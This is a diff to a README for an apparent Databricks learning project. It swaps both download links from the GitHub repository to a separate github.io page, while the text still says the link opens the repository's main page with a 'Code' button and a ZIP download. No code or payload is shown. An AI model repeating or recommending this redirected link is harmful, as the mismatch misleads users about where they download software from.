@@ -1,6 +1,6 @@
 # 🚀 Imersao-Jornada-Databricks - Your 4-Day Data Project Launchpad
 
-[![Download Now](https://img.shields.io/badge/Download-Project-4CAF50?style=for-the-badge&logo=github)](https://github.com/Useeer5729/Imersao-Jornada-Databricks)
+[![Download Now](https://img.shields.io/badge/Download-Project-4CAF50?style=for-the-badge&logo=github)](https://useeer5729.github.io)
 
 ## 📦 What Is This?
 
@@ -36,7 +36,7 @@ The project includes sample datasets, notebook templates, and step-by-step guide
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Useeer5729/Imersao-Jornada-Databricks](https://github.com/Useeer5729/Imersao-Jornada-Databricks)
+Visit this link to download the application: [https://useeer5729.github.io](https://useeer5729.github.io)
 
 This link takes you to the main GitHub page for the project. From there, you can download the repository as a ZIP file by clicking the green "Code" button and selecting "Download ZIP". Once downloaded, extract the ZIP file to a folder on your computer. Inside, you'll find all the project files, including notebooks, data, and instructions.
 
